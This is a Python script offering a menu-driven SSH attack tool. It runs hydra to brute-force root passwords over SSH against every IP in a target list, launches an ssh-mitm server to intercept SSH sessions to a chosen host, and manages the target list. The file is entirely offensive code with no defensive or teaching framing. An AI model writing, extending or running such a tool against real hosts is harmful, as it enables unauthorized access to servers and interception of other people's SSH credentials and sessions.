import glob
import subprocess
import threading

loopControl = True
while loopControl:
    user_choice = input(
        "\nSelect option:\n"
        "1. Launch dictionary attack & brute force\n"
        "2. Launch man-in-the-middle attack\n"
        "3. Print targets\n"
        "4. Feed Targets for dict. attack\n"
        "5. Exit \n"
        "> "
    )

    if user_choice == "1":
        for wordlist in sorted(glob.glob("passwords/hydra_split_*.txt")):
            print(f"\nRunning with {wordlist}...")

            cmd = [
                "hydra",
                "-l", "root",
                "-P", wordlist,
                "-M", "targets/ips.txt",
                "ssh", "-o", "output.txt"
            ]

            with subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
            ) as p:
                for line in p.stdout:
                    print(line, end="")
                p.wait()

                print(f"{wordlist} finished with return code {p.returncode}")

    elif user_choice == "2":
        def pump(stream, label):
            for line in iter(stream.readline, ''):
                print(f"[{label}] {line}", end='')
            stream.close()

        appimage_path = "mitm/./ssh-mitm-x86_64.AppImage"
        mitmChoice = input("TARGET-HOST:")
        command = [appimage_path, "server", "--remote-host", mitmChoice]

        process = subprocess.Popen(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
        )

        print(f"Started SSH-MITM with PID: {process.pid}")

        t1 = threading.Thread(target=pump, args=(process.stdout, "STDOUT"), daemon=True)
        t2 = threading.Thread(target=pump, args=(process.stderr, "STDERR"), daemon=True)
        t1.start()
        t2.start()

        rc = process.wait()
        print(f"MITM exited with return code {rc}")

    elif user_choice == "3":
        with open("targets/ips.txt", "r") as f:
            lines = f.readlines()

        ipCount = len(lines)
        content = "".join(lines)

        print(f"Target Count: {ipCount}")
        print(content)

    elif user_choice == "4":
        user_text = input("ENTER TARGET IP WITH SSH:")
        with open("targets/ips.txt", "a") as f:
            f.write(user_text + "\n")
        print("target", user_text, "added")

    elif user_choice == "5":
        print("Exiting program.")
        break

    else:
        print("Wrong Input...try again.")
